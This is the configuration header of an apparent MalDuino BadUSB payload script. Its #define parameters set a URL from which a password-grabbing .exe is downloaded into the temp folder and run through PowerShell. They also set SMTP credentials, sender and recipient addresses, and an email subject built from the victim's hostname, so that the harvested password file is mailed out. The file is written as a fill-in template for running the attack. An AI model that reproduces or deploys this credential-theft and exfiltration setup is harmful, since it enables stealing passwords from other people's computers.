/* Script parameters */
/*- MANDATORY -*/
// APP_URL: URL to the .exe file to execute
#define APP_URL "http://example.org/your_tool.exe"
// EMAIL_FROM: Email 'from' field to send the email with the report from
#define EMAIL_FROM "from@example.org"
// EMAIL_TO: Email 'to' field where the report will be sent to
#define EMAIL_TO "to@example.org"
// EMAIL_SMTP: Email SMTP server to use to send the mail
#define EMAIL_SMTP "smtp.example.org"
// EMAIL_PORT: Email SMTP server port (must use SSL)
//             See SMTPInfo.EnableSsl line command to disable SSL
#define EMAIL_PORT "587"
// EMAIL_USER: Username to authenticate against the SMTP server
#define EMAIL_USER "from@example.org"
// EMAIL_PASSWORD: Password to authenticate agains the SMTP server
#define EMAIL_PASSWORD "my_strong_password"
/*- OPTIONAL -*/
// DOWNLOAD_TIME: Estimated time in milliseconds the application to grab
//                passwords takes to download (including time to launch
//                powershell and exit it)
//                Default is 17500s
#define DOWNLOAD_TIME 17500
// WORKDIR_CMD: Workdir to temporary save files (app & logs)
//              You can use %% to retrieve environment variables
//              Default is "%TEMP%"
#define WORKDIR_CMD "%TEMP%"
// WORKDIR_PS:  Same as WORKDIR_CMD, but if you use environment variables
//              you have to use $env:variable to retrieve it (as in PowerShell)
//              Default is "$env:temp"
#define WORKDIR_PS "$env:temp"
// FILES_NAME: Name of the .exe to save when downloaded (without .exe)
//             Name of the .txt file generated with the passwords (without .txt)
//             Default is "pass"
#define FILES_NAME "pass"
// EMAIL_SUBJECT: Subject of the email to send
//                You can use PowerShell syntax to include dynamic text
//                Default is "MalDuino Report for ' + $(hostname) + '"
#define EMAIL_SUBJECT "MalDuino Report for ' + $(hostname) + '"
// EMAIL_BODY: Body text of the email
//             Default is "Your information is attached as a text file"
#define EMAIL_BODY "Your information is attached as a text file"
